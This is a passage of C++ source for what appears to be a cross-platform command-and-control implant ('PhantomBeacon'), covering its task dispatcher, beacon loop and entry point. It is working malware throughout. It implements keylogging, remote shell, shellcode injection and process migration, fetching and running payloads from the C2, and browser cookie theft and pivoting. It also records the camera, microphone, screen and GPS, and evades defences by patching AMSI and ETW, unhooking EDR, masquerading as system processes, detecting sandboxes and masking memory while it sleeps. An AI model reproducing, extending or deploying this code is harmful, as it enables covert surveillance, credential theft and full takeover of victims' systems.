        if (subCmd == XOR_DEC(XOR_STR("stop")).c_str())  return keylogger::stop();
        if (subCmd == XOR_DEC(XOR_STR("status")).c_str()) return keylogger::status();
        if (subCmd == XOR_DEC(XOR_STR("dump")).c_str()) {
            std::string filter;
            if (iss >> filter)
                return keylogger::dump(filter);
            return keylogger::dump();
        }
        return XOR_DEC(XOR_STR("Usage: keylog <start|stop|status|dump [process]>")).c_str();
    }
    else if (action == XOR_DEC(XOR_STR("shell")).c_str() || action == XOR_DEC(XOR_STR("exec")).c_str() || action == XOR_DEC(XOR_STR("run")).c_str()) {
        std::string shell_cmd;
        std::getline(iss >> std::ws, shell_cmd);
        if (shell_cmd.empty()) return XOR_DEC(XOR_STR("Usage: shell <command>")).c_str();
        return run_shell_command(shell_cmd);
    }
    else if (action == XOR_DEC(XOR_STR("exit")).c_str() || action == XOR_DEC(XOR_STR("kill")).c_str()) {
        return "\x01\x02EX";
    }
    else if (action == XOR_DEC(XOR_STR("inject")).c_str()) {
#ifdef _WIN32
        DWORD pid;
#else
        pid_t pid;
#endif
        std::string b64code;
        if (iss >> pid >> b64code) {
#ifdef _WIN32
            if (pid == GetCurrentProcessId()) return XOR_DEC(XOR_STR("Self-injection not allowed.")).c_str();
#endif
            auto code = crypto::base64_decode(b64code);
            for (auto& b : code) b ^= 0xAA;
#ifdef _WIN32
            // Prefer threadless APC (no new thread) — stealthiest first.
            if (apc::threadless_apc(pid, code))
                return XOR_DEC(XOR_STR("Injected via threadless APC (no new thread).")).c_str();
            // Fallback: remote thread injection
#endif
            std::string result = injection::inject_shellcode(pid, code);
            return result;
        }
        return XOR_DEC(XOR_STR("Usage: inject <pid> <base64_shellcode>")).c_str();
    }
    else if (action == XOR_DEC(XOR_STR("migrate")).c_str()) {
        std::string b64code;
        if (iss >> b64code) {
            auto code = crypto::base64_decode(b64code);
            for (auto& b : code) b ^= 0xAA;
            std::string result = injection::migrate_to_new_process(code);
            if (result.find("Migrated successfully") != std::string::npos) {
                return std::string("\x01\x02MG") + result;
            }
            return result;
        }
#ifdef _WIN32
        // Argument-less migrate: SELF-MIGRATION. Pull the PIC loader blob
        // (beacon.bin — same bytes that ran in-memory at deployment) from
        // the C2 with the embedded payload token, inject it into a
        // sacrificial suspended process, and exit this instance. The new
        // beacon re-checks-in with the same identity; the server-side
        // nonce-based replay guard accepts it (counter reset is expected
        // after a migration/restart).
        {
            // /x serves the XOR(0xAA)-wrapped loader+PE blob — the exact
            // bytes the deployment dropper executes in-memory.
            std::string pic_xored = net::http_request(cfg,
                XOR_WDEC(XOR_WSTR(L"GET")).c_str(),
                XOR_WDEC(XOR_WSTR(L"/x")).c_str(), "", "");
            if (pic_xored.size() < 4096) {
                return "MIGRATE_ERROR: failed to fetch PIC payload from C2 (" +
                       std::to_string(pic_xored.size()) + " bytes)";
            }
            auto code = std::vector<unsigned char>(pic_xored.begin(), pic_xored.end());
            for (auto& b : code) b ^= 0xAA;
            std::string result = injection::migrate_to_new_process(code);
            if (result.find("Migrated successfully") != std::string::npos) {
                return std::string("\x01\x02MG") + result +
                       " (self-migrated from C2 PIC payload)";
            }
            return "MIGRATE_ERROR: " + result;
        }
#else
        return XOR_DEC(XOR_STR("Usage: migrate <base64_shellcode>")).c_str();
#endif
    }
    else if (action == XOR_DEC(XOR_STR("mem-run")).c_str()) {
#ifdef _WIN32
        std::string b64code;
        if (iss >> b64code) {
            auto code = crypto::base64_decode(b64code);
            std::string err;
            if (inmemory::run_shellcode(code, &err)) return XOR_DEC(XOR_STR("Shellcode executed in memory.")).c_str();
            return "MEM_RUN_ERROR: " + err;
        }
        return XOR_DEC(XOR_STR("Usage: mem-run <base64_shellcode>")).c_str();
#else
        std::string b64bin;
        if (iss >> b64bin) {
            auto bin = crypto::base64_decode(b64bin);
            if (inmemory::run_binary(bin)) return XOR_DEC(XOR_STR("Binary executed via memfd.")).c_str();
            return XOR_DEC(XOR_STR("Memfd execution failed.")).c_str();
        }
        return XOR_DEC(XOR_STR("Usage: mem-run <base64_binary>")).c_str();
#endif
    }
#ifdef _WIN32
    else if (action == XOR_DEC(XOR_STR("inject-eb")).c_str()) {
        // Early Bird APC: shellcode runs BEFORE the target's entry point.
        // Usage: inject-eb <exe_path> <base64_shellcode>
        std::string exePath, b64code;
        if (iss >> exePath >> b64code) {
            auto code = crypto::base64_decode(b64code);
            for (auto& b : code) b ^= 0xAA;
            std::wstring wpath(exePath.begin(), exePath.end());
            if (apc::early_bird_apc(wpath, code))
                return XOR_DEC(XOR_STR("Early Bird APC injection succeeded.")).c_str();
            return XOR_DEC(XOR_STR("Early Bird APC injection failed.")).c_str();
        }
        return XOR_DEC(XOR_STR("Usage: inject-eb <exe_path> <base64_shellcode>")).c_str();
    }
    else if (action == XOR_DEC(XOR_STR("inject-tl")).c_str()) {
        // Threadless APC: shellcode queued on EXISTING threads (no new thread).
        // Usage: inject-tl <pid> <base64_shellcode>
        DWORD pid;
        std::string b64code;
        if (iss >> pid >> b64code) {
            if (pid == GetCurrentProcessId())
                return XOR_DEC(XOR_STR("Self-injection not allowed.")).c_str();
            auto code = crypto::base64_decode(b64code);
            for (auto& b : code) b ^= 0xAA;
            if (apc::threadless_apc(pid, code))
                return XOR_DEC(XOR_STR("Threadless APC injection succeeded.")).c_str();
            return XOR_DEC(XOR_STR("Threadless APC injection failed.")).c_str();
        }
        return XOR_DEC(XOR_STR("Usage: inject-tl <pid> <base64_shellcode>")).c_str();
    }
#endif
    else if (action == "screenshot") {
        return screenshot::capture();
    }
    else if (action == "gps") {
        return media_gps::get_gps_info();
    }
    else if (action == "camera") {
        return media_camera::capture_image();
    }
    else if (action == "audio") {
        std::string duration;
        try {
            if (iss >> duration) {
                return media_audio::record_audio(std::stoi(duration));
            }
        } catch (...) { /* invalid argument: fall back to default */ }
        return media_audio::record_audio(5);
    }
    else if (action == "screen-record") {
        std::string duration;
        try {
            if (iss >> duration) {
                return media_screen::record_screen_passive(std::stoi(duration));
            }
        } catch (...) { /* fall back to default */ }
        return media_screen::record_screen_passive(5);
    }
    else if (action == "screen-record-live") {
        std::string duration;
        try {
            if (iss >> duration) {
                return media_screen::record_screen_live(std::stoi(duration));
            }
        } catch (...) { /* fall back to default */ }
        return media_screen::record_screen_live(5);
    }
    else if (action == "screen-dump") {
        return media_screen::dump_live_recording();
    }
    else if (action == "screen-stream") {
        // TRUE live: record 5s chunks and push each to the stream queue; the
        // main loop sends them to the C2 immediately so the operator watches
        // the screen while it is being recorded. `screen-stream-stop` halts.
        std::string duration;
        try {
            if (iss >> duration) {
                return media_screen::record_screen_stream(std::stoi(duration));
            }
        } catch (...) { /* fall back to default */ }
        return media_screen::record_screen_stream(60);
    }
    else if (action == "screen-stream-stop") {
        return media_screen::stop_screen_stream();
    }
    else if (action == XOR_DEC(XOR_STR("remote")).c_str()) {
        // Deploy the standalone Remote Session module (GUI takeover): fetch
        // the compiled binary from the C2 and execute it. The module
        // registers as its own R-… beacon and streams screen frames + input.
        // Usage: remote [host] [port] [use_https] — defaults to the same C2.
        std::string r_host = C2_HOST;
        int r_port = C2_PORT;
        int r_ssl = C2_USE_HTTPS;
        std::string tok;
        if (iss >> tok) r_host = tok;
        if (iss >> tok) r_port = std::atoi(tok.c_str());
        if (iss >> tok) r_ssl = std::atoi(tok.c_str());
#ifdef _WIN32
        std::string url = std::string(r_ssl ? "https" : "http") + "://" +
                          r_host + ":" + std::to_string(r_port) +
                          "/api/v1/remote_payload_windows?auth=" + crypto::payload_token();
#elif defined(__ANDROID__) || defined(ANDROID)
        std::string url = std::string(r_ssl ? "https" : "http") + "://" +
                          r_host + ":" + std::to_string(r_port) +
                          "/api/v1/remote_payload_android?auth=" + crypto::payload_token();
#else
        std::string url = std::string(r_ssl ? "https" : "http") + "://" +
                          r_host + ":" + std::to_string(r_port) +
                          "/api/v1/remote_payload_linux?auth=" + crypto::payload_token();
#endif
        std::string bin = net::http_request(cfg, XOR_WDEC(XOR_WSTR(L"GET")).c_str(),
            std::wstring(url.begin(), url.end()).c_str(), "", "");
        if (bin.size() < 4096 || bin.find("Payload") != std::string::npos) {
            return XOR_DEC(XOR_STR("REMOTE_ERROR: module binary unavailable ")).c_str() +
                   std::to_string(bin.size());
        }
#ifdef _WIN32
        // write to a random temp name and spawn hidden
        char tmp[MAX_PATH];
        GetTempPathA(MAX_PATH, tmp);
        std::string path = std::string(tmp) + "srv" + std::to_string(GetCurrentProcessId()) + ".exe";
        HANDLE hf = CreateFileA(path.c_str(), GENERIC_WRITE, 0, nullptr,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, nullptr);
        if (hf == INVALID_HANDLE_VALUE)
            return XOR_DEC(XOR_STR("REMOTE_ERROR: cannot write module")).c_str();
        DWORD w;
        WriteFile(hf, bin.data(), (DWORD)bin.size(), &w, nullptr);
        CloseHandle(hf);
        STARTUPINFOA si{};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi{};
        std::string cmd = path + " " + r_host + " " + std::to_string(r_port) +
                          " " + std::to_string(r_ssl);
        if (!CreateProcessA(nullptr, &cmd[0], nullptr, nullptr, FALSE,
                            CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
                            nullptr, nullptr, &si, &pi)) {
            DeleteFileA(path.c_str());
            return XOR_DEC(XOR_STR("REMOTE_ERROR: spawn failed")).c_str();
        }
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return XOR_DEC(XOR_STR("Remote session module deployed (pid ")).c_str() +
                       std::to_string(pi.dwProcessId) + XOR_DEC(XOR_STR("); interact via `beacons`")).c_str();
#elif defined(__ANDROID__) || defined(ANDROID)
        // Android: the module is an APK (MediaProjection capture +
        // AccessibilityService input). A memfd exec cannot start an APK —
        // install it and launch the bootstrap activity instead.
        {
            std::string path = "/data/local/tmp/.srv" +
                               std::to_string(getpid()) + ".apk";
            FILE* f = fopen(path.c_str(), "wb");
            if (!f) return XOR_DEC(XOR_STR("REMOTE_ERROR: cannot write APK")).c_str();
            fwrite(bin.data(), 1, bin.size(), f);
            fclose(f);
            std::string cmd = "pm install -g " + path +
                              " >/dev/null 2>&1 && am start -n com.phantom.remote/.MainActivity";
            int rc = std::system(cmd.c_str());
            remove(path.c_str());
            if (rc != 0)
                return XOR_DEC(XOR_STR("REMOTE_ERROR: APK install failed (need shell/root)")).c_str();
            return XOR_DEC(XOR_STR("Remote session module (APK) deployed; interact via `beacons`")).c_str();
        }
#else
        // POSIX: run from a memfd (no disk trace).
        // `bin` is the raw HTTP body; run_binary takes the bytes as a
        // vector (the same type the mem-run path decodes), so convert here
        // instead of relying on an implicit string->vector conversion that
        // does not exist (this broke the beacon-syntax job).
        std::vector<unsigned char> bin_bytes(bin.begin(), bin.end());
        if (inmemory::run_binary(bin_bytes)) {
            return XOR_DEC(XOR_STR("Remote session module deployed in-memory; interact via `beacons`")).c_str();
        }
        return XOR_DEC(XOR_STR("REMOTE_ERROR: memfd exec failed")).c_str();
#endif
    }
    else if (action == XOR_DEC(XOR_STR("socks")).c_str()) {
        int localPort;
        if (iss >> localPort) {
            return proxy::start_socks(localPort);
        }
        return XOR_DEC(XOR_STR("Usage: socks <local_port>")).c_str();
    }
    else if (action == XOR_DEC(XOR_STR("socks-stop")).c_str()) {
        return proxy::stop_socks();
    }
#ifdef _WIN32
    else if (action == XOR_DEC(XOR_STR("smb-pipe")).c_str()) {
        std::string pipeName;
        std::getline(iss >> std::ws, pipeName);
        return smb::start_smb_pipe(pipeName);
    }
    else if (action == XOR_DEC(XOR_STR("smb-pipe-stop")).c_str()) {
        return smb::stop_smb_pipe();
    }
#endif
    else if (action == XOR_DEC(XOR_STR("browser-pivot")).c_str()) {
        int localPort;
        if (iss >> localPort) {
            unsigned long pid = 0;
            std::string pidStr;
            if (iss >> pidStr) {
                try {
                    pid = std::stoul(pidStr);
                } catch (...) { pid = 0; }
            }
            return browser_pivot::start_pivot(localPort, pid);
        }
        return XOR_DEC(XOR_STR("Usage: browser-pivot <local_port> [pid]")).c_str();
    }
    else if (action == XOR_DEC(XOR_STR("browser-pivot-stop")).c_str()) {
        return browser_pivot::stop_pivot();
    }
    else if (action == XOR_DEC(XOR_STR("browser-list")).c_str()) {
        return browser_pivot::list_browsers();
    }

    else if (action == XOR_DEC(XOR_STR("wlan-scan")).c_str()) {
        return wlan_scan::scan();
    }
    else if (action == XOR_DEC(XOR_STR("wlan-locate")).c_str()) {
        return wlan_scan::scan_json();
    }
    else if (action == XOR_DEC(XOR_STR("bt-scan")).c_str()) {
        return bt_scan::scan();
    }
    else if (action == XOR_DEC(XOR_STR("bt-scan-json")).c_str()) {
        return bt_scan::scan_json();
    }
    else if (action == XOR_DEC(XOR_STR("netstat")).c_str()) {
        return netstat::format_connections();
    }
    else if (action == XOR_DEC(XOR_STR("netstat-json")).c_str()) {
        return netstat::format_connections_json();
    }
    else if (action == XOR_DEC(XOR_STR("cookies")).c_str()) {
        return cookie_stealer::format_cookies();
    }
    else if (action == XOR_DEC(XOR_STR("cookies-json")).c_str()) {
        return cookie_stealer::format_cookies_json();
    }
    else if (action == XOR_DEC(XOR_STR("cdp-launch")).c_str()) {
        int port = 9222;
        iss >> port;
        return cdp_pivot::launch_and_connect(port);
    }
    else if (action == XOR_DEC(XOR_STR("cdp-cookies")).c_str()) {
        int port = 9222;
        iss >> port;
        return cdp_pivot::cdp_cookies(port);
    }
    else if (action == XOR_DEC(XOR_STR("cdp-eval")).c_str()) {
        int port = 9222;
        iss >> port;
        std::string expr;
        std::getline(iss >> std::ws, expr);
        if (expr.empty()) return "Usage: cdp-eval <expression>";
        return cdp_pivot::cdp_evaluate(expr, port);
    }
    else if (action == XOR_DEC(XOR_STR("cdp-nav")).c_str()) {
        int port = 9222;
        iss >> port;
        std::string url;
        std::getline(iss >> std::ws, url);
        if (url.empty()) return "Usage: cdp-nav <url>";
        return cdp_pivot::cdp_navigate(url, port);
    }
    else if (action == XOR_DEC(XOR_STR("cdp-fetch")).c_str()) {
        int port = 9222;
        iss >> port;
        std::string url;
        std::getline(iss >> std::ws, url);
        if (url.empty()) return "Usage: cdp-fetch <url>";
        return cdp_pivot::cdp_fetch(url, port);
    }
    // Unknown built-in: execute as OS shell command (C2 interact mode)
    return run_shell_command(cmd);
}


// ── Generate Beacon ID ─────────────────────────────────────────────────────

std::string generate_beacon_id() {
#ifdef _WIN32
    char computer[256] = {0};
    DWORD csize = sizeof(computer);
    GetComputerNameA(computer, &csize);
    char hex[9];
    srand(static_cast<unsigned>(time(nullptr)) ^ GetCurrentProcessId());
    snprintf(hex, sizeof(hex), "%04X%04X", rand() & 0xFFFF, rand() & 0xFFFF);
    return std::string(XOR_DEC(XOR_STR("WIN-")).c_str()) + computer + "-" + hex;
#else
    char hostname[256] = {0};
    gethostname(hostname, sizeof(hostname));
    char hex[9];
    srand(static_cast<unsigned>(time(nullptr)) ^ getpid());
    snprintf(hex, sizeof(hex), "%04X%04X", rand() & 0xFFFF, rand() & 0xFFFF);
    return std::string(XOR_DEC(XOR_STR("LNX-")).c_str()) + hostname + "-" + hex;
#endif
}


// ── Beacon Main Loop ──────────────────────────────────────────────────────

extern "C" void beacon_main(int argc, char** argv) {
    // The anti-analysis gate lives further down, AFTER the transport config
    // exists, so a refusal can report WHY instead of exiting in silence.

#ifdef _WIN32
    // ── Single-instance guard ────────────────────────────────────────────
    // The no-disk RunKey rebirth can fire while an earlier beacon instance
    // is still alive (logon while the operator session runs): two beacons
    // with the SAME HMAC identity double-poll, race tasks and break the
    // server's nonce tracking. A per-identity mutex in the user session
    // makes the duplicate exit silently within seconds.
    {
        std::string mux = std::string("Local\\PhantomBeacon-") +
#ifdef BEACON_AUTH_ENABLED
            BEACON_AUTH_ID;
#else
            "default";
#endif
        HANDLE hMux = CreateMutexA(nullptr, TRUE, mux.c_str());
        if (hMux && GetLastError() == ERROR_ALREADY_EXISTS) {
            ReleaseMutex(hMux);
            CloseHandle(hMux);
            return;   // duplicate birth — let the senior instance work
        }
        // hMux intentionally leaked: held for process lifetime.
    }

    srand(static_cast<unsigned>(time(nullptr)) ^ GetCurrentProcessId());
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return;
    #ifndef DISABLE_ANTI
    // Hide beacon from PEB module lists (Process Explorer / EDR module walk)
    peb_unlink::hide_module();
    // HW-breakpoint unhooking: arm a debug register on a clean ntdll
    // 'syscall; ret' gadget and route sensitive syscalls through the VEH
    // so EDR userland hooks are bypassed WITHOUT patching ntdll .text
    // (nothing for the integrity monitor to flag).
    anti::install_hwbp_engine();
    #endif
#else
    srand(static_cast<unsigned>(time(nullptr)) ^ getpid());
    #ifndef DISABLE_ANTI
    // POSIX PEB-equivalent: drop our module from the loader's link_map
    // (Linux); on macOS the dyld image list is read-only, so it is a no-op.
    peb_unlink::hide_module();
    #endif
#endif

#ifndef DISABLE_ANTI
    // Process masquerade (docs/beacon_platform_matrix.md) — documented on
    // every platform but never invoked, so the capability was inert. Windows
    // rewrites the PEB `FullDllName`; Linux/Android use prctl(PR_SET_NAME);
    // macOS has no supported API and the helper is a documented no-op.
#ifdef _WIN32
    anti::masquerade::rename_process(L"svchost.exe");
#else
    anti::masquerade::rename_process(L"kworker/0:1");
#endif
#endif

#ifndef DISABLE_ANTI
    // AMSI / ETW patching (docs/beacon_platform_matrix.md). Windows really
    // patches `AmsiScanBuffer` and `EtwEventWrite`; on POSIX there is no
    // in-process equivalent to hook, so both are documented no-ops and one
    // call site is correct on every platform. These were defined but never
    // CALLED, which left a capability the matrix promised inert.
    anti::patch_amsi();
    anti::patch_etw();
#endif

    // Held by shared_ptr so a DETACHED task worker cannot read a destroyed
    // config: `cfg` is used by reference everywhere below, and
    // run_task_with_timeout hands the same shared_ptr to the worker, so the
    // object outlives every thread that may still be reading it.
    auto cfg_owner = std::make_shared<net::C2Config>();
    net::C2Config& cfg = *cfg_owner;
#if BEACON_AUTH_ENABLED
    cfg.beacon_id = BEACON_AUTH_ID;
#else
    cfg.beacon_id = generate_beacon_id();
#endif
#ifdef _WIN32
    cfg.host      = std::wstring(C2_HOST, C2_HOST + strlen(C2_HOST));
#else
    cfg.host      = C2_HOST;
#endif
    cfg.port      = C2_PORT;
    cfg.sleep_ms  = 5000;
    cfg.base_sleep_ms = 5000;
    cfg.jitter    = 30;
    // Endpoint ladder + proxy posture from the build config: a single
    // compiled-in host dies with the first filtered address, and a beacon
    // that ignores the system proxy never calls home from a managed network.
    cfg.seed_ladder(C2_HOST, C2_HOSTS, C2_HOST_PINS, C2_HOST_PUBKEY_PINS);
    cfg.proxy = C2_PROXY;
    // LAST RING: consulted only after the whole ladder keeps failing
    cfg.dead_drop = C2_DEADDROP;

    if (argc >= 2) {
        std::string host_str(argv[1]);
        // an operator-supplied host becomes the FIRST rung without throwing
        // away the compiled-in fallbacks behind it
        cfg.prefer_endpoint(host_str);
        if (argc >= 3) cfg.port = std::atoi(argv[2]);
        if (argc >= 4) cfg.use_https = std::atoi(argv[3]) != 0;
    }
#if BEACON_AUTH_ENABLED
    std::vector<BYTE> persisted_auth_secret;
    if (crypto::load_auth_secret(persisted_auth_secret)) {
        std::copy(persisted_auth_secret.begin(), persisted_auth_secret.end(),
                  cfg.auth_secret.begin());
    }
#endif

#ifndef DISABLE_ANTI
    // ── Anti-analysis gate ──────────────────────────────────────────────
    // Refuse to operate under a debugger or in a virtualised sandbox. This
    // used to `stalling_delay(50); return;` in SILENCE, so the operator saw
    // "no check-in" and could not tell a detected sandbox from a failed
    // exploit — two situations that call for different responses, and only
    // the target can say which one happened. Burn the sandbox's time, then
    // send ONE best-effort abort event so the C2 timeline names the reason.
    // The beacon never enters the task loop either way.
    {
        const char* abort_reason = nullptr;
        if (anti::is_debugger_present())      abort_reason = "debugger present";
        else if (anti::is_vm())               abort_reason = "virtualised/sandbox environment";
        if (abort_reason) {
            anti::stalling_delay(50);
            // Register the identity BEFORE the abort report: handle_result()
            // refuses a result from any beacon the C2 has not seen check in
            // yet, and this gate runs before the loop's first check-in — so
            // without this ping the event below is dropped as an unknown
            // beacon and the operator is back to the silence this fixes.
            net::checkin(cfg);
            std::string event = std::string(XOR_DEC(XOR_STR("BEACON_ABORT: ")).c_str())
                + abort_reason
                + XOR_DEC(XOR_STR(" - the beacon refused to start")).c_str();
            net::send_result(cfg, XOR_DEC(XOR_STR("beacon-startup")).c_str(), event);
#ifdef _WIN32
            net::g_ctx.cleanup();
#endif
            return;
        }
    }
#endif

    bool alive = true;
    auto escape_json = [](const std::string& s) {
        std::string res;
        for (unsigned char c : s) {
            if (c == '"') res += "\\\"";
            else if (c == '\\') res += "\\\\";
            else if (c == '\n') res += "\\n";
            else if (c == '\r') res += "\\r";
            else if (c == '\t') res += "\\t";
            else if (c < 0x20) {
                // raw control bytes are invalid in JSON: encode as \u00XX
                char hex[7];
                snprintf(hex, sizeof(hex), "\\u%04X", c);
                res += hex;
            }
            else res += static_cast<char>(c);
        }
        return res;
    };

    // Failed results are retained in order. A single failed upload must not
    // overwrite results produced by later tasks in the same check-in.
    std::vector<std::pair<std::string, std::string>> pending_results;
    int consecutive_failures = 0;

    // ── Health self-report counters ────────────────────────────────────
    unsigned long checkins_ok = 0, checkins_fail = 0, tasks_done = 0;
    unsigned long results_pending_peak = 0;
    unsigned long long uptime_start = (unsigned long long)time(nullptr);
    std::string last_error;

    // mirror into the globals the `health` command reads
    g_uptime_start = uptime_start;

    while (alive) {
        std::string telemetry = std::string(XOR_DEC(XOR_STR("{\"build_id\":\"")).c_str()) + BUILD_ID +
                    XOR_DEC(XOR_STR("\",\"sysinfo\":\"")).c_str() + escape_json(recon::get_sysinfo()) +
                    XOR_DEC(XOR_STR("\"}")).c_str();

#if C2_DEADDROP_BOOTSTRAP
        // DEAD-DROP-FIRST: resolve the live endpoint ONCE, before the very
        // first check-in, so the compiled address is only a fallback rung.
        // A failure is a plain no-op — the compiled ladder takes over and
        // the ordinary last-ring path retries after `dd_after` failures.
        if (!cfg.dd_bootstrap_done) {
            cfg.dd_bootstrap_done = true;
            if (!cfg.dead_drop.empty() && net::refresh_from_dead_drop(cfg)) {
                cfg.dd_failures = 0;
            }
        }
#endif

        std::string response = net::checkin(cfg, telemetry);

        if (!response.empty()) {
            consecutive_failures = 0;
            ++checkins_ok;
            g_checkins_ok = checkins_ok;
            cfg.on_success();
            // server reachable again: restore the operator-configured base
            // sleep (exponential backoff from the outage must not stick)
            if (cfg.sleep_ms != cfg.base_sleep_ms) cfg.sleep_ms = cfg.base_sleep_ms;
            // Retry previously undelivered results first. The sends are
            // INDEPENDENT: one result the transport refuses (a single
            // oversized/malformed message) must not stall the results
            // behind it, which is exactly what the old `else break;` did.
            // `drain_pending_results` keeps trying the rest and only stops
            // the round once a full batch has failed in a row (the link,
            // not the message, is the problem). An item is removed ONLY
            // after the transport reports success; the server de-duplicates
            // retries if the response itself was lost.
            task::drain_pending_results(
                pending_results,
                [&cfg](const std::string& task_id, const std::string& output) {
                    return net::send_result(cfg, task_id, output);
                });
            auto tasks = json_mini::parse_tasks(response);
            for (auto& task : tasks) {
                ++tasks_done;
                g_tasks_done = tasks_done;
                // Per-command budget: media captures run for the operator-
                // requested duration plus a margin; everything else gets the
                // default (a camera ReadSample hang must not wedge the loop).
                int budget_ms = DEFAULT_TASK_TIMEOUT_MS;
                {
                    std::istringstream tss(task.command);
                    std::string tok;
                    tss >> tok;
                    int dur = 0;
                    tss >> dur;
                    if ((tok == "audio" || tok == "screen-record" ||
                         tok == "screen-record-live" ||
                         tok == "screen-stream") && dur > 0) {
                        budget_ms = dur * 1000 + 15000;
                    } else if (tok == "camera") {
                        budget_ms = 45000; // MF init + frame grabs can be slow
                    }
                }
                std::string output = run_task_with_timeout(task.command, cfg_owner, budget_ms);
                if (output.size() >= 4 && output[0] == '\x01' && output[1] == '\x02') {
                    if (output[2] == 'E' && output[3] == 'X') {
                        alive = false;
                        break;
                    }
                    if (output[2] == 'M' && output[3] == 'G') {
                        output = output.substr(4);
                        if (!net::send_result(cfg, task.task_id, output)) {
                            pending_results.emplace_back(task.task_id, output);
                        }
                        alive = false;
                        break;
                    }
                }
                if (!net::send_result(cfg, task.task_id, output)) {
                    pending_results.emplace_back(task.task_id, output);
                }
            }
            // drain progressive screen-stream segments (true live): each
            // segment is sent as its own result so the C2/UI see it now.
            {
                static unsigned long g_live_seq = 0;
                for (auto& seg : media_screen::stream::drain()) {
                    std::string sid = "live-seg-" + std::to_string(++g_live_seq);
                    if (!net::send_result(cfg, sid, seg)) {
                        pending_results.emplace_back(sid, seg);
                    }
                }
            }
#ifdef _WIN32
            // smb-pipe commands accepted on the named pipe are drained here
            // (they are regular beacon commands executed locally)
            std::string piped;
            while ((piped = smb::pop_pending_command()) != "") {
                std::string out = run_task_with_timeout(piped, cfg_owner);
                if (!net::send_result(cfg, XOR_DEC(XOR_STR("smb-pipe")).c_str(), out)) {
                    pending_results.emplace_back(XOR_DEC(XOR_STR("smb-pipe")).c_str(), out);
                }
            }
#endif
        } else {
            // server unreachable: exponential backoff, capped at 60s
            consecutive_failures++;
            ++checkins_fail;
            g_checkins_fail = checkins_fail;
            last_error = "checkin fail #" + std::to_string(consecutive_failures);
            // Endpoint ladder: after a per-endpoint failure budget the beacon
            // rotates to the next C2 (redirector behind a taken-down host,
            // filtered address, provider outage). The window is reset after
            // a move so the backoff restarts from the base sleep.
            if (cfg.on_failure()) {
                last_error += " -> rotating to " + cfg.endpoint();
                cfg.sleep_ms = cfg.base_sleep_ms;
                consecutive_failures = 1;
                // cached connection state belongs to the OLD endpoint
#ifdef _WIN32
                net::g_ctx.cleanup();
#endif
            }
            // LAST RING: when the ladder keeps failing, consult the dead drop
            // for a fresh endpoint. Its own counter bounds the cost: a dead
            // drop that is ALSO unreachable costs one request per window, not
            // one per check-in.
            if (!cfg.dead_drop.empty() && ++cfg.dd_failures >= cfg.dd_after) {
                cfg.dd_failures = 0;
                if (net::refresh_from_dead_drop(cfg)) {
                    last_error += " -> dead-drop endpoint " + cfg.endpoint();
                    cfg.sleep_ms = cfg.base_sleep_ms;
                    consecutive_failures = 1;
                }
            }
            g_last_error = last_error;
            if (consecutive_failures > 1) {
                cfg.sleep_ms = std::min(60000, cfg.sleep_ms * 2);
            }
        }
        if (pending_results.size() > results_pending_peak)
            results_pending_peak = (unsigned long)pending_results.size();

        int jitter_sleep = cfg.get_sleep_ms();
#ifdef _WIN32
        // Masked sleep (Ekko upgrade): RC4-encrypts RW sections AND the live
        // thread stack, spoofs the return chain to a signed-module address,
        // then waits on a high-resolution timer. A memory scan during sleep
        // sees ciphertext; a stack scan sees legitimate system frames.
        #ifndef DISABLE_ANTI
        ekko::ekko_sleep_masked(jitter_sleep);
        #else
        Sleep(jitter_sleep);
        #endif
#else
        // Linux/macOS: masked sleep (RC4 over the idle stack region), the
        // POSIX counterpart of the Windows Ekko path; keylogger runs in its
        // own thread.
        #ifndef DISABLE_ANTI
        ekko::ekko_sleep_masked(jitter_sleep);
        #else
        Sleep(jitter_sleep);
        #endif
#endif
        keylogger::poll();
    }

#ifdef _WIN32
    net::cleanup();
    WSACleanup();
#endif
    // Shut down: cancel every stranded task worker so no result is published
    // for work the C2 already considers dead.
    //
    // drain() does not wait for a blocked worker, because it cannot: the
    // cancel is cooperative and is only observed once work() returns. A
    // thread still trapped in a syscall dies with the process, and the count
    // is reported rather than hidden -- "we gave up on N workers" is
    // information, silence is not.
    const size_t abandoned = task::Registry::instance().drain();
    if (abandoned) {
        std::fprintf(stderr,
                     "[beacon] %zu task worker(s) still running at shutdown\n",
                     abandoned);
    }
}


// ── Entry Point ────────────────────────────────────────────────────────────

#ifdef _WIN32
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
    if (injection::self_hollow())
        return 0;

    std::vector<std::string> args;
    args.push_back("beacon.exe");
    if (lpCmdLine && strlen(lpCmdLine) > 0) {
        std::istringstream iss(lpCmdLine);
        std::string token;
        while (iss >> token) args.push_back(token);
    }

    std::vector<char*> argv_ptrs;
    for (auto& a : args) argv_ptrs.push_back(&a[0]);

    beacon_main(static_cast<int>(argv_ptrs.size()), argv_ptrs.data());
    return 0;
}
#else
int main(int argc, char** argv) {
    beacon_main(argc, argv);
    return 0;
}
#endif

